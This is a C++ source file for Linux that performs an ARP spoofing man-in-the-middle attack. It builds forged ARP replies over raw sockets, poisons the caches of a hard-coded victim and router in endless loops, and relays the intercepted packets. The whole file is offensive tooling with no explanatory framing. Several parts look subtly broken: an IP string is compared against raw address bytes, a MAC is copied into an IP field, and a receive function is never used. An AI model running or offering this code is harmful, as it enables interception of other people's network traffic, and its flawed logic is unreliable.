#include <iostream>
#include <cstring>
#include <unistd.h>
#include <arpa/inet.h>
#include <net/if.h>
#include <net/ethernet.h>
#include <netpacket/packet.h>
#include <netinet/in.h>
#include <netinet/if_ether.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <thread>

#define IP_LENGTH 4
#define MAC_LENGTH 6
#define ETHER_HEADER_LENGTH 14
#define ETHER_ARP_LENGTH 28
#define ETHER_ARP_PACKET_LENGTH 42

using namespace std;

int finish_scan = 0;
char src_ip[IP_LENGTH];
unsigned char src_mac[MAC_LENGTH];
void socket_init(int& sd) {
    sd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
    if (sd < 0) {
        cout << "Error on socket init!\n";
        exit(1);
    }
}

void getaddr(char* IP, unsigned char* MC, int& index) {
    const char* eth_name = "eth0";
    struct ifreq ifr;
    int sd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sd < 0) {
        cout << "Error on socket init!\n";
        exit(1);
    }
    
    strcpy(ifr.ifr_name, eth_name);

    if (ioctl(sd, SIOCGIFADDR, &ifr) < 0) exit(1);
    memcpy(IP, ifr.ifr_addr.sa_data + 2, IP_LENGTH);

    if (ioctl(sd, SIOCGIFINDEX, &ifr) < 0) exit(1);
    index = ifr.ifr_ifindex;

    if (ioctl(sd, SIOCGIFHWADDR, &ifr) < 0) exit(1);
    memcpy(MC, ifr.ifr_hwaddr.sa_data, MAC_LENGTH);

    close(sd);
}

void print(unsigned char* ip, unsigned char* mac) {
    string IP = "";
    for (int i = 0; i < 4; i++) {
        if (i != 0) printf(".");
        printf("%d", ip[i]);
    }
    printf("\t\t");
    for (int j = 0; j < MAC_LENGTH; j++) {
            if (j != 0) printf(":");
        printf("%02X", mac[j]);
    }
    printf("\n");

}

void arp_recv(int sd, char* src_ip, char* fake_buf, struct sockaddr_ll send_addr) {
    struct timeval tv = { 1, 0 };
    if (setsockopt(sd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv)) < 0) {
        cout << "Error on recv_socket!\n";
    }
    unsigned char rbuf[80];
    while (true) {
        if (recvfrom(sd, rbuf, sizeof(rbuf), 0, NULL, NULL) < 0) {
            if (finish_scan == 3) break;
            if (finish_scan) finish_scan += 1;
            // cout << "Nothing got or error!\n";
            continue;
        }

        // Check source ip
        int ok = 1;
        for (int i = 38, j = 0; i < 38 + 4; i++, j++) {
            if ((unsigned int) rbuf[i] != (unsigned int) (unsigned char) src_ip[j]) {
                ok = false;
                // cout << j << ' ' << (unsigned int)rbuf[i] << ' ' << (unsigned int)(unsigned char) src_ip[j] << '\n';
            }
        }
        if (rbuf[31] == src_ip[3] || rbuf[31] == 1) ok = 0;
        if (!ok) continue;

        print(rbuf + 28, rbuf + 22);

        if (rbuf[31] != 128) continue;

        struct ether_header* eth_header = (struct ether_header*)(fake_buf);
        struct ether_arp* arp_packet = (struct ether_arp*) (fake_buf + ETHER_HEADER_LENGTH);
        memcpy(eth_header -> ether_dhost, rbuf + 22, MAC_LENGTH);
        memcpy(arp_packet -> arp_tha, rbuf + 22, MAC_LENGTH);
        memcpy(arp_packet -> arp_tpa, rbuf + 28, IP_LENGTH);

        if (sendto(sd, fake_buf, ETHER_ARP_PACKET_LENGTH, 0, (struct sockaddr*) &send_addr, sizeof(send_addr)) < 0) {
            cout << "Sendto Error!\n";    
        }
    }
}

void build_arp_packet(char* buf, unsigned char* src_mac, unsigned char* dst_mac, char* src_ip, char* dst_ip, uint16_t op) {
    struct ether_header* eth_header = (struct ether_header*) buf; //ether_header
    memcpy(eth_header -> ether_dhost, dst_mac, MAC_LENGTH);
    memcpy(eth_header -> ether_shost, src_mac, MAC_LENGTH);
    eth_header -> ether_type = htons(ETHERTYPE_ARP);    

    struct ether_arp* arp_packet = (struct ether_arp*) (buf + ETHER_HEADER_LENGTH); //arp
    arp_packet -> arp_hrd = htons(ARPHRD_ETHER);
    arp_packet -> arp_pro = htons(ETHERTYPE_IP);
    arp_packet -> arp_hln = MAC_LENGTH;
    arp_packet -> arp_pln = IP_LENGTH;
    arp_packet -> arp_op  = htons(op);
    memcpy(arp_packet -> arp_sha, src_mac, MAC_LENGTH);
    memcpy(arp_packet -> arp_tha, dst_mac, MAC_LENGTH);
    inet_pton(AF_INET, src_ip, arp_packet->arp_spa);
    inet_pton(AF_INET, dst_ip, arp_packet->arp_tpa);
}

void get_mac(int sd, char* target_ip, unsigned char* src_mac, unsigned char* dst_mac) {
    char buf[ETHER_ARP_PACKET_LENGTH] = {0};
    build_arp_packet(buf, src_mac, (unsigned char*)"\xff\xff\xff\xff\xff\xff", src_ip, target_ip, ARPOP_REQUEST);
    
    if (sendto(sd, buf, ETHER_ARP_PACKET_LENGTH, 0, NULL, 0) < 0) {
        cout << "Sendto Error!\n";    
    }

    struct sockaddr_ll recv_addr;
    socklen_t recv_addr_len = sizeof(recv_addr);
    while (recvfrom(sd, buf, sizeof(buf), 0, (struct sockaddr*)&recv_addr, &recv_addr_len) > 0) {
        struct ether_header *eth_header = (struct ether_header *)buf;
        struct ether_arp *arp_packet = (struct ether_arp *)(buf + ETHER_HEADER_LENGTH);
        if (ntohs(eth_header->ether_type) == ETHERTYPE_ARP) {
            if (memcmp(arp_packet->arp_spa, arp_packet->arp_tpa, IP_LENGTH) == 0 &&
                memcmp(arp_packet->arp_spa, target_ip, IP_LENGTH) == 0) {
                memcpy(dst_mac, arp_packet->arp_sha, MAC_LENGTH);
                break;
            }
        }
    }
}

void arp_spoof(int sd, char* victim_ip, char* router_ip, unsigned char* src_mac, unsigned char* dst_mac) {
    char buf[ETHER_ARP_PACKET_LENGTH] = {0};
    build_arp_packet(buf, src_mac, dst_mac, victim_ip, router_ip, ARPOP_REPLY);

    struct sockaddr_ll send_addr;
    memset(&send_addr, 0, sizeof(send_addr));
    send_addr.sll_family = AF_PACKET;
    send_addr.sll_protocol = htons(ETH_P_ARP);
    send_addr.sll_pkttype = PACKET_BROADCAST;
    send_addr.sll_ifindex = 2;
    send_addr.sll_halen = 0x06;
    memset(send_addr.sll_addr, 0xff, 6);

    while (1) {
        if (sendto(sd, buf, ETHER_ARP_PACKET_LENGTH, 0, (struct sockaddr*) &send_addr, sizeof(send_addr)) < 0) {
            cout << "Sendto Error!\n";    
        }
        sleep(1);
    }
}

void arp_forward(int sd, unsigned char* my_mac) {
    unsigned char buf[2048];
    struct ether_header *eth_header = (struct ether_header *)buf;
    struct ether_arp *arp_packet = (struct ether_arp *)(buf + ETHER_HEADER_LENGTH);

    while (1) {
        int len = recvfrom(sd, buf, sizeof(buf), 0, NULL, NULL);
        if (len <= 0) continue;

        if (eth_header->ether_type == htons(ETHERTYPE_ARP)) {
            if (memcmp(arp_packet->arp_tha, my_mac, MAC_LENGTH) == 0 && ntohs(arp_packet->arp_op) == ARPOP_REQUEST) {
                memcpy(eth_header->ether_dhost, arp_packet->arp_sha, MAC_LENGTH);
                memcpy(eth_header->ether_shost, my_mac, MAC_LENGTH);
                memcpy(arp_packet->arp_tha, arp_packet->arp_sha, MAC_LENGTH);
                memcpy(arp_packet->arp_sha, my_mac, MAC_LENGTH);
                memcpy(arp_packet->arp_tpa, arp_packet->arp_spa, IP_LENGTH);
                memcpy(arp_packet->arp_spa, my_mac, IP_LENGTH);
                arp_packet->arp_op = htons(ARPOP_REPLY);
                
                if (sendto(sd, buf, len, 0, NULL, 0) < 0) {
                    cout << "Sendto Error!\n";    
                }
            }
        } else if (eth_header->ether_type == htons(ETHERTYPE_IP)) {
            if (memcmp(eth_header->ether_shost, my_mac, MAC_LENGTH) == 0) {
                memcpy(eth_header->ether_shost, my_mac, MAC_LENGTH);
                memcpy(eth_header->ether_dhost, arp_packet->arp_tha, MAC_LENGTH);

                if (sendto(sd, buf, len, 0, NULL, 0) < 0) {
                    cout << "Sendto Error!\n";    
                }
            }
        }
    }
}

int main(int argc, char const *argv[]) {
    int index;
    getaddr(src_ip, src_mac, index);

    int sd;
    socket_init(sd);

    char victim_ip[] = "192.168.1.100"; // Victim的IP地址
    char router_ip[] = "192.168.1.1";   // Router的IP地址
    unsigned char victim_mac[MAC_LENGTH];
    unsigned char router_mac[MAC_LENGTH];

    get_mac(sd, victim_ip, src_mac, victim_mac);
    get_mac(sd, router_ip, src_mac, router_mac);

    thread spoof_to_victim(arp_spoof, sd, victim_ip, router_ip, src_mac, victim_mac);
    thread spoof_to_router(arp_spoof, sd, router_ip, victim_ip, src_mac, router_mac);
    thread forward_packets(arp_forward, sd, src_mac);

    spoof_to_victim.join();
    spoof_to_router.join();
    forward_packets.join();

    close(sd);

    return 0;
}
